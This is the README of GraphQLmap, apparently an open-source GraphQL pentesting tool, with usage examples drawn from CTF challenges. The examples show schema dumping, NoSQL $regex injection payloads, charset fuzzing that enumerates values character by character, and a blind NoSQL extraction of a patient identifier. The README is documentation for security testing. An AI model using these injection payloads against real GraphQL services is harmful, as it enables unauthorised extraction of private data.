# GraphQLmap

> GraphQLmap is a scripting engine to interact with a graphql endpoint for pentesting purposes.


* [Install](#install)
* [Features and examples](#features-and-examples)
  - [Dump a GraphQL schema](#dump-a-graphql-schema)
  - [Interact with a GraphQL endpoint](#interact-with-a-graphql-endpoint)
  - Execute GraphQL queries
  - Autocomplete queries
  - [GraphQL field fuzzing](#graphql-field-fuzzing)
  - [NoSQL injection inside a GraphQL field](#nosql-injection)
  - [SQL injection inside a GraphQL field](#sqli-injection)

I :heart: pull requests, feel free to improve this script :)

You can also contribute with a :beers: IRL or using Github Sponsoring button.

## Install

```basic
$ git clone https://github.com/swisskyrepo/GraphQLmap
$ python graphqlmap.py                                                              
   _____                 _      ____  _                            
  / ____|               | |    / __ \| |                           
 | |  __ _ __ __ _ _ __ | |__ | |  | | |     _ __ ___   __ _ _ __  
 | | |_ | '__/ _` | '_ \| '_ \| |  | | |    | '_ ` _ \ / _` | '_ \ 
 | |__| | | | (_| | |_) | | | | |__| | |____| | | | | | (_| | |_) |
  \_____|_|  \__,_| .__/|_| |_|\___\_\______|_| |_| |_|\__,_| .__/ 
                  | |                                       | |    
                  |_|                                       |_|    
                                         Author:Swissky Version:1.0
usage: graphqlmap.py [-h] [-u URL] [-v [VERBOSITY]] [--method [METHOD]] [--headers [HEADERS]]

optional arguments:
  -h, --help          show this help message and exit
  -u URL              URL to query : example.com/graphql?query={}
  -v [VERBOSITY]      Enable verbosity
  --method [METHOD]   HTTP Method to use interact with /graphql endpoint
  --headers [HEADERS] HTTP Headers sent to /graphql endpoint
  --json              Send requests using POST and JSON
```


## Features and examples

:warning: Examples are based on several CTF challenges from HIP2019.

### Connect to a graphql endpoint

```
python3 graphqlmap.py -u https://yourhostname.com/graphql -v --method POST --headers '{"Authorization" : "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0ZXh0Ijoibm8gc2VjcmV0cyBoZXJlID1QIn0.JqqdOesC-R4LtOS9H0y7bIq-M8AGYjK92x4K3hcBA6o"}'
```

### Dump a GraphQL schema

Use `dump_new` to dump the GraphQL schema, this function will automaticly populate the "autocomplete" with the found fields.    
[:movie_camera: Live Example](https://asciinema.org/a/14YuWoDOyCztlx7RFykILit4S)

```powershell
GraphQLmap > dump_new                     
============= [SCHEMA] ===============
e.g: name[Type]: arg (Type!)                   
                                                                                               
Query                                          
        doctor[]: email (String!),                                                             
        doctors[Doctor]:                                                                       
        patients[Patient]:                                                                     
        patient[]: id (ID!),                   
        allrendezvous[Rendezvous]:                                                             
        rendezvous[]: id (ID!),                                                                
Doctor                                         
        id[ID]:                                                                                
        firstName[String]:                     
        lastName[String]:                                                                      
        specialty[String]:                     
        patients[None]: 
        rendezvous[None]: 
        email[String]: 
        password[String]: 
[...]
```


### Interact with a GraphQL endpoint

Write a GraphQL request and execute it.

```powershell
GraphQLmap > {doctors(options: 1, search: "{ \"lastName\": { \"$regex\": \"Admin\"} }"){firstName lastName id}}
{
    "data": {
        "doctors": [
            {
                "firstName": "Admin",
                "id": "5d089c51dcab2d0032fdd08d",
                "lastName": "Admin"
            }
        ]
    }
}
```

### GraphQL field fuzzing

Use `GRAPHQL_INCREMENT` and `GRAPHQL_CHARSET` to fuzz a parameter.      
[:movie_camera: Live Example](https://asciinema.org/a/ICCz3PqHVNrBf262x6tQfuwqT)

```powershell
GraphQLmap > {doctors(options: 1, search: "{ \"lastName\": { \"$regex\": \"AdmiGRAPHQL_CHARSET\"} }"){firstName lastName id}}   
[+] Query: (45) {doctors(options: 1, search: "{ \"lastName\": { \"$regex\": \"Admi!\"} }"){firstName lastName id}}   
[+] Query: (45) {doctors(options: 1, search: "{ \"lastName\": { \"$regex\": \"Admi$\"} }"){firstName lastName id}}   
[+] Query: (45) {doctors(options: 1, search: "{ \"lastName\": { \"$regex\": \"Admi%\"} }"){firstName lastName id}}   
[+] Query: (45) {doctors(options: 1, search: "{ \"lastName\": { \"$regex\": \"Admi(\"} }"){firstName lastName id}}   
[+] Query: (45) {doctors(options: 1, search: "{ \"lastName\": { \"$regex\": \"Admi)\"} }"){firstName lastName id}}   
[+] Query: (206) {doctors(options: 1, search: "{ \"lastName\": { \"$regex\": \"Admi*\"} }"){firstName lastName id}}   
[+] Query: (45) {doctors(options: 1, search: "{ \"lastName\": { \"$regex\": \"Admi+\"} }"){firstName lastName id}}   
[+] Query: (45) {doctors(options: 1, search: "{ \"lastName\": { \"$regex\": \"Admi,\"} }"){firstName lastName id}}   
[+] Query: (45) {doctors(options: 1, search: "{ \"lastName\": { \"$regex\": \"Admi-\"} }"){firstName lastName id}}   
[+] Query: (206) {doctors(options: 1, search: "{ \"lastName\": { \"$regex\": \"Admi.\"} }"){firstName lastName id}}   
[+] Query: (45) {doctors(options: 1, search: "{ \"lastName\": { \"$regex\": \"Admi/\"} }"){firstName lastName id}}   
[+] Query: (45) {doctors(options: 1, search: "{ \"lastName\": { \"$regex\": \"Admi0\"} }"){firstName lastName id}}   
[+] Query: (45) {doctors(options: 1, search: "{ \"lastName\": { \"$regex\": \"Admi1\"} }"){firstName lastName id}}     
[+] Query: (206) {doctors(options: 1, search: "{ \"lastName\": { \"$regex\": \"Admi?\"} }"){firstName lastName id}}
[+] Query: (206) {doctors(options: 1, search: "{ \"lastName\": { \"$regex\": \"Admin\"} }"){firstName lastName id}}
```

### NoSQLi injection

Use `BLIND_PLACEHOLDER` inside the query for the `nosqli` function.    
[:movie_camera: Live Example](https://asciinema.org/a/wp2lixHqRV0pxxhZ8nsgUj6s7)

```powershell
GraphQLmap > nosqli
Query > {doctors(options: "{\"\"patients.ssn\":1}", search: "{ \"patients.ssn\": { \"$regex\": \"^BLIND_PLACEHOLDER\"}, \"lastName\":\"Admin\" , \"firstName\":\"Admin\" }"){id, firstName}}
Check > 5d089c51dcab2d0032fdd08d
Charset > 0123456789abcdef-
[+] Data found: 4f537c0a-7da6-4acc-81e1-8c33c02ef3b
GraphQLmap >
```

### SQL injection 

```powershell
GraphQLmap > postgresqli
GraphQLmap > mysqli
GraphQLmap > mssqli
```


## TODO

* Docker with vulnerable GraphQL
* Unit tests
* Handle node
```
{
  user {
    edges {
      node {
        username
      }
    }
  }
}
```
